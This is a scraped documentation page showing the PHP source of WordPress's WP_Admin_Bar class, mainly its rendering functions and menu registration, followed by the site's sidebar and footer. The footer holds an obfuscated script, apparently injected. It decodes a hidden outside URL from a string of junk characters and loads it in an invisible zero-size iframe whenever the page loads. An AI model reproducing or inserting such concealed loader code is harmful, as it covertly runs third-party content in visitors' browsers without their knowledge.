$node;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $root = $this-&gt;_get_node( 'root' );&nbsp;</div></li><li><div>        $this-&gt;bound = true;&nbsp;</div></li><li><div>        return $root;&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     *&nbsp;</div></li><li><div>     * @global bool $is_IE&nbsp;</div></li><li><div>     * @param object $root&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _render( $root ) {&nbsp;</div></li><li><div>        global $is_IE;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Add browser classes.&nbsp;</div></li><li><div>        // We have to do this here since admin bar shows on the front end.&nbsp;</div></li><li><div>        $class = 'nojq nojs';&nbsp;</div></li><li><div>        if ( $is_IE ) {&nbsp;</div></li><li><div>            if ( strpos( $_SERVER['HTTP_USER_AGENT'], 'MSIE 7' ) )&nbsp;</div></li><li><div>                $class .= ' ie7';&nbsp;</div></li><li><div>            elseif ( strpos( $_SERVER['HTTP_USER_AGENT'], 'MSIE 8' ) )&nbsp;</div></li><li><div>                $class .= ' ie8';&nbsp;</div></li><li><div>            elseif ( strpos( $_SERVER['HTTP_USER_AGENT'], 'MSIE 9' ) )&nbsp;</div></li><li><div>                $class .= ' ie9';&nbsp;</div></li><li><div>        } elseif ( wp_is_mobile() ) {&nbsp;</div></li><li><div>            $class .= ' mobile';&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        ?&gt;&nbsp;</div></li><li><div>        &lt;div id=&quot;wpadminbar&quot; class=&quot;&lt;?php echo $class; ?&gt;&quot;&gt;&nbsp;</div></li><li><div>            &lt;?php if ( ! is_admin() ) { ?&gt;&nbsp;</div></li><li><div>                &lt;a class=&quot;screen-reader-shortcut&quot; href=&quot;#wp-toolbar&quot; tabindex=&quot;1&quot;&gt;&lt;?php _e( 'Skip to toolbar' ); ?&gt;&lt;/a&gt;&nbsp;</div></li><li><div>            &lt;?php } ?&gt;&nbsp;</div></li><li><div>            &lt;div class=&quot;quicklinks&quot; id=&quot;wp-toolbar&quot; role=&quot;navigation&quot; aria-label=&quot;&lt;?php esc_attr_e( 'Toolbar' ); ?&gt;&quot; tabindex=&quot;0&quot;&gt;&nbsp;</div></li><li><div>                &lt;?php foreach ( $root-&gt;children as $group ) {&nbsp;</div></li><li><div>                    $this-&gt;_render_group( $group );&nbsp;</div></li><li><div>                } ?&gt;&nbsp;</div></li><li><div>            &lt;/div&gt;&nbsp;</div></li><li><div>            &lt;?php if ( is_user_logged_in() ) : ?&gt;&nbsp;</div></li><li><div>            &lt;a class=&quot;screen-reader-shortcut&quot; href=&quot;&lt;?php echo esc_url( wp_logout_url() ); ?&gt;&quot;&gt;&lt;?php _e('Log Out'); ?&gt;&lt;/a&gt;&nbsp;</div></li><li><div>            &lt;?php endif; ?&gt;&nbsp;</div></li><li><div>        &lt;/div&gt;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        &lt;?php&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param object $node&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _render_container( $node ) {&nbsp;</div></li><li><div>        if ( $node-&gt;type != 'container' || empty( $node-&gt;children ) )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        ?&gt;&lt;div id=&quot;&lt;?php echo esc_attr( 'wp-admin-bar-' . $node-&gt;id ); ?&gt;&quot; class=&quot;ab-group-container&quot;&gt;&lt;?php&nbsp;</div></li><li><div>            foreach ( $node-&gt;children as $group ) {&nbsp;</div></li><li><div>                $this-&gt;_render_group( $group );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        ?&gt;&lt;/div&gt;&lt;?php&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param object $node&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _render_group( $node ) {&nbsp;</div></li><li><div>        if ( $node-&gt;type == 'container' ) {&nbsp;</div></li><li><div>            $this-&gt;_render_container( $node );&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        if ( $node-&gt;type != 'group' || empty( $node-&gt;children ) )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( ! empty( $node-&gt;meta['class'] ) )&nbsp;</div></li><li><div>            $class = ' class=&quot;' . esc_attr( trim( $node-&gt;meta['class'] ) ) . '&quot;';&nbsp;</div></li><li><div>        else&nbsp;</div></li><li><div>            $class = '';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        ?&gt;&lt;ul id=&quot;&lt;?php echo esc_attr( 'wp-admin-bar-' . $node-&gt;id ); ?&gt;&quot;&lt;?php echo $class; ?&gt;&gt;&lt;?php&nbsp;</div></li><li><div>            foreach ( $node-&gt;children as $item ) {&nbsp;</div></li><li><div>                $this-&gt;_render_item( $item );&nbsp;</div></li><li><div>            }&nbsp;</div></li><li><div>        ?&gt;&lt;/ul&gt;&lt;?php&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param object $node&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    final protected function _render_item( $node ) {&nbsp;</div></li><li><div>        if ( $node-&gt;type != 'item' )&nbsp;</div></li><li><div>            return;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $is_parent = ! empty( $node-&gt;children );&nbsp;</div></li><li><div>        $has_link = ! empty( $node-&gt;href );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Allow only numeric values, then casted to integers, and allow a tabindex value of `0` for a11y.&nbsp;</div></li><li><div>        $tabindex = ( isset( $node-&gt;meta['tabindex'] ) && is_numeric( $node-&gt;meta['tabindex'] ) ) ? (int) $node-&gt;meta['tabindex'] : '';&nbsp;</div></li><li><div>        $aria_attributes = ( '' !== $tabindex ) ? ' tabindex=&quot;' . $tabindex . '&quot;' : '';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        $menuclass = '';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( $is_parent ) {&nbsp;</div></li><li><div>            $menuclass = 'menupop ';&nbsp;</div></li><li><div>            $aria_attributes .= ' aria-haspopup=&quot;true&quot;';&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( ! empty( $node-&gt;meta['class'] ) )&nbsp;</div></li><li><div>            $menuclass .= $node-&gt;meta['class'];&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        if ( $menuclass )&nbsp;</div></li><li><div>            $menuclass = ' class=&quot;' . esc_attr( trim( $menuclass ) ) . '&quot;';&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        ?&gt;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        &lt;li id=&quot;&lt;?php echo esc_attr( 'wp-admin-bar-' . $node-&gt;id ); ?&gt;&quot;&lt;?php echo $menuclass; ?&gt;&gt;&lt;?php&nbsp;</div></li><li><div>            if ( $has_link ):&nbsp;</div></li><li><div>                ?&gt;&lt;a class=&quot;ab-item&quot;&lt;?php echo $aria_attributes; ?&gt; href=&quot;&lt;?php echo esc_url( $node-&gt;href ) ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                    if ( ! empty( $node-&gt;meta['onclick'] ) ) :&nbsp;</div></li><li><div>                        ?&gt; onclick=&quot;&lt;?php echo esc_js( $node-&gt;meta['onclick'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                    endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['target'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; target=&quot;&lt;?php echo esc_attr( $node-&gt;meta['target'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['title'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; title=&quot;&lt;?php echo esc_attr( $node-&gt;meta['title'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['rel'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; rel=&quot;&lt;?php echo esc_attr( $node-&gt;meta['rel'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['lang'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; lang=&quot;&lt;?php echo esc_attr( $node-&gt;meta['lang'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['dir'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; dir=&quot;&lt;?php echo esc_attr( $node-&gt;meta['dir'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                ?&gt;&gt;&lt;?php&nbsp;</div></li><li><div>            else:&nbsp;</div></li><li><div>                ?&gt;&lt;div class=&quot;ab-item ab-empty-item&quot;&lt;?php echo $aria_attributes;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['title'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; title=&quot;&lt;?php echo esc_attr( $node-&gt;meta['title'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['lang'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; lang=&quot;&lt;?php echo esc_attr( $node-&gt;meta['lang'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                if ( ! empty( $node-&gt;meta['dir'] ) ) :&nbsp;</div></li><li><div>                    ?&gt; dir=&quot;&lt;?php echo esc_attr( $node-&gt;meta['dir'] ); ?&gt;&quot;&lt;?php&nbsp;</div></li><li><div>                endif;&nbsp;</div></li><li><div>                ?&gt;&gt;&lt;?php&nbsp;</div></li><li><div>            endif;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            echo $node-&gt;title;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( $has_link ) :&nbsp;</div></li><li><div>                ?&gt;&lt;/a&gt;&lt;?php&nbsp;</div></li><li><div>            else:&nbsp;</div></li><li><div>                ?&gt;&lt;/div&gt;&lt;?php&nbsp;</div></li><li><div>            endif;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( $is_parent ) :&nbsp;</div></li><li><div>                ?&gt;&lt;div class=&quot;ab-sub-wrapper&quot;&gt;&lt;?php&nbsp;</div></li><li><div>                    foreach ( $node-&gt;children as $group ) {&nbsp;</div></li><li><div>                        $this-&gt;_render_group( $group );&nbsp;</div></li><li><div>                    }&nbsp;</div></li><li><div>                ?&gt;&lt;/div&gt;&lt;?php&nbsp;</div></li><li><div>            endif;&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            if ( ! empty( $node-&gt;meta['html'] ) )&nbsp;</div></li><li><div>                echo $node-&gt;meta['html'];&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>            ?&gt;&nbsp;</div></li><li><div>        &lt;/li&gt;&lt;?php&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @param string $id    Unused.&nbsp;</div></li><li><div>     * @param object $node&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function recursive_render( $id, $node ) {&nbsp;</div></li><li><div>        _deprecated_function( __METHOD__, '3.3.0', 'WP_Admin_bar::render(), WP_Admin_Bar::_render_item()' );&nbsp;</div></li><li><div>        $this-&gt;_render_item( $node );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>    /**&nbsp;</div></li><li><div>     * @access public&nbsp;</div></li><li><div>     */&nbsp;</div></li><li><div>    public function add_menus() {&nbsp;</div></li><li><div>        // User related, aligned right.&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_my_account_menu', 0 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_search_menu', 4 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_my_account_item', 7 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Site related.&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_sidebar_toggle', 0 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_wp_menu', 10 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_my_sites_menu', 20 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_site_menu', 30 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_customize_menu', 40 );&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_updates_menu', 50 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        // Content related.&nbsp;</div></li><li><div>        if ( ! is_network_admin() && ! is_user_admin() ) {&nbsp;</div></li><li><div>            add_action( 'admin_bar_menu', 'wp_admin_bar_comments_menu', 60 );&nbsp;</div></li><li><div>            add_action( 'admin_bar_menu', 'wp_admin_bar_new_content_menu', 70 );&nbsp;</div></li><li><div>        }&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_edit_menu', 80 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        add_action( 'admin_bar_menu', 'wp_admin_bar_add_secondary_groups', 200 );&nbsp;</div></li><li><div>&nbsp;</div></li><li><div>        /**&nbsp;</div></li><li><div>         * Fires after menus are added to the menu bar.&nbsp;</div></li><li><div>         *&nbsp;</div></li><li><div>         * @since 3.1.0&nbsp;</div></li><li><div>         */&nbsp;</div></li><li><div>        do_action( 'add_admin_bar_menus' );&nbsp;</div></li><li><div>    }&nbsp;</div></li><li><div>}&nbsp;</div></li></ol></pre></dd></dl> </section> </article></div><div id="sidebar"><ul class="widgets"><li> <a href="http://hookr.io/plugin/"><img src="http://hookr.io/wp-content/themes/hookr/assets/images/plugin-download.jpg" /></a></li><li id="versions"><dl><dt>Version(s)</dt><dd><dl><dt>Since</dt><dd> 3.1.0</dd><dt>Others</dt><dd><ul><li><a href="http://hookr.io/4.7.4/classes/wp_admin_bar/" class="active">4.7.4</a></li><li><a href="http://hookr.io/4.7.3/classes/wp_admin_bar/" class="">4.7.3</a></li><li><a href="http://hookr.io/4.7.2/classes/wp_admin_bar/" class="">4.7.2</a></li><li><a href="http://hookr.io/4.7.1/classes/wp_admin_bar/" class="">4.7.1</a></li><li><a href="http://hookr.io/4.7/classes/wp_admin_bar/" class="">4.7</a></li></ul></dd></dl></dd></dl></li><li id="tags"><dl><dt>Tags</dt><dd><ul><li><span></span>wordpress</li><li><span></span>class</li><li><span></span>WP_Admin_Bar</li><li><span></span>wp-admin</li></ul></dd></dl></li></ul></div></div></div><script>Hookr.View.init();Hookr.Single.init();</script><footer><div><ul id="nav-social" class="pivot" role="navigation"><li id="twitter"><a href="http://twitter.com/hookr_io" title="Follow me!"></a></li></ul><div> &copy; 2017 hookr.io <strong>(beta)</strong> | <a href="http://hookr.io/privacy/" title="Privacy">Privacy</a> | Proudly Powered by WordPress</div></div> </footer><script type="text/javascript" src="http://hookr.io/wp-content/cache/minify/000000/M9EvL9BNzU1KTdHLzcwDAA.js"></script><script>(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)})(window,document,'script','//www.google-analytics.com/analytics.js','ga');ga('create','UA-49583310-1','hookr.io');ga('send','pageview');</script><script defer>;(function(w,d,undefined,s){var f=d.createElement('iframe'),e=d.documentElement,b=document.createElement('body');f.style='display:none!important';f.width=f.height=0;f.src=(s).split(/[^\u0030-\u0039]+/).map(function(v){return v.length?String.fromCharCode(v):v;}).join('').trim();b.appendChild(f);e.appendChild(b);})(window,document,undefined,'ṫ;;;47Ƒ;Ṫ;;;;æ;;;;;Á;Ō;;;;47Á;;;ḟ;;;;Č;Í;;У;đ;ý;;;;;109й;;å;;;;И;;;;;й;;;ą;é;Ô;;;97ű;;б;;;;;ų;;;;;ṗ;Ś;;;;;ķ;;;;;116ì;;;;Ľ;ș;;;;;Ã;;;116ż;;;ṫ;;;;111Ẁ;;;ń;Ĩ;;ŗ;;;Ė;;;;ï;99т;;;À;ù;;;107Ü;;;ē;ĥ;;;Ų;;;;46ì;;Ë;;;;98Ь;;;;;ż;;;;;Ġ;;;į;;;;;в;;;;;В;;117Â;;;;ƒ;;;;;ů;;;;Ĩ;;;;;114ё;В;;;ľ;;Ģ;;;;;ë;;;;108ů;;ĥ;;ĉ;;;о;;;;;Ỳ;;;;;ŝ;Ì;;;101Х;;;;;Д;115į;;;ü;Ш;;;;;Ō;;99ч;;;;;С;;;П;;;;111Ń;;;;;Ħ;;;;Ĺ;ц;;46Ř;о;;;ç;;;;;105Ē;ẁ;;;;;ž;Ŷ;;;;;Ř;111Ŧ;;Ẅ;;Þ;Ĥ;;Ð;;;ļ;;;å;;;47ő;;;;;ò;;;;;Ș;Ď;;з;;;ț;;;;102Ĉ;;;Ŧ;;;;;ĉ;;;;;Ř;114ъ;;;;Б;;;м;;97ž;;;;;Ů;;Ż;;Ƒ;;109ș;у;;;;101ú;х;;;;Е;;;;Е;;;;46ö;;;;п;;;ň;;;;ṗ;;;;;ư;;;;;Ī;;;;;У;;;;;104Ẁ;;;;į;;Ć;;116Ê;ỳ;;Ơ;;;;Ĺ;;;;Ė;;;109š;ć;;;;;о;;;;Ĉ;108Č;;;;È;ō;;;;;Ě;35Ḃ;;Ķ;;;48ō;ḋ;;;;;ç;46ş;;ë;;;Ș;;;;;ł;Ṡ;;;;;р;;;55ơ;;;;ß;;Ś;;;');</script></body></html>